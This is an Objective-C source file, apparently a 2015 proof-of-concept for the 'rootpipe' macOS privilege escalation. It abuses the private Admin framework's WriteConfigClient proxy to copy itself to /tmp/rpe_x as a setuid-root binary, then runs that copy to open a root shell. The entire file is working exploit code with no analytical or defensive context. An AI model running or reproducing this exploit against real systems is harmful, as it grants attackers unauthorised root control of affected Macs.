//
//  main.m
//  rootpipe_exploit
//
//  Created by tihmstar on 13.04.15.
//  Copyright (c) 2015 tihmstar. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/objc-load.h>

@interface SFAuthorization : NSObject
+(id)authorization;
@end

@interface WriteConfigClient : NSObject
+(id)sharedClient;
-(void)authenticateUsingAuthorizationSync:(id)auth;
-(id)remoteProxy;
@end

@interface Proxy : NSObject;
-(void)createFileWithContents:(NSData*)data path:(NSString*)path attributes:(NSDictionary *)attributes;
@end


int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // insert code here...
        
        
        //try
        if (!setuid(0)) {
            NSLog(@"Exploit succeeded, poping root shell");
            system("/bin/bash");
            return 0;
        }
        
        NSLog(@"Running rootpipe exploit");
        
        NSString *selfpath = NSProcessInfo.processInfo.arguments[0];
        
        NSString *bPath = @"/System/Library/PrivateFrameworks/Admin.framework";
        NSLog(@"Loading framework");
        if (![[NSFileManager defaultManager] fileExistsAtPath:bPath]) {
            NSLog(@"[Warning] Admin.framework not found, trying to load SystemAdministration.framework");
            bPath = @"/System/Library/PrivateFrameworks/SystemAdministration.framework";
        }
        
        NSBundle *admin = [NSBundle bundleWithPath:bPath];
        if (![admin load]) {
            NSLog(@"[Error] loading framework");
            return -1;
        }
        NSLog(@"Loaded successfully");
        
        Class sfauth = objc_lookUpClass("SFAuthorization");
        Class wcc = objc_lookUpClass("WriteConfigClient");
        
        SFAuthorization *auth = [sfauth authorization];
        WriteConfigClient *sharedClient = [wcc sharedClient];
        [sharedClient authenticateUsingAuthorizationSync: auth];
        Proxy *tool = [sharedClient remoteProxy];
        
        NSData *data = [NSData dataWithContentsOfFile:selfpath];
        NSString *path = @"/tmp/rpe_x";
        NSLog(@"Getting suid flag");
        [tool createFileWithContents:data path:path attributes:@{ NSFilePosixPermissions : @04777 }];
        NSLog(@"Shell in");
        NSLog(@"3");
        sleep(1);
        NSLog(@"2");
        sleep(1);
        NSLog(@"1");
        sleep(1);
        system([path UTF8String]);
    }
    return 0;
}
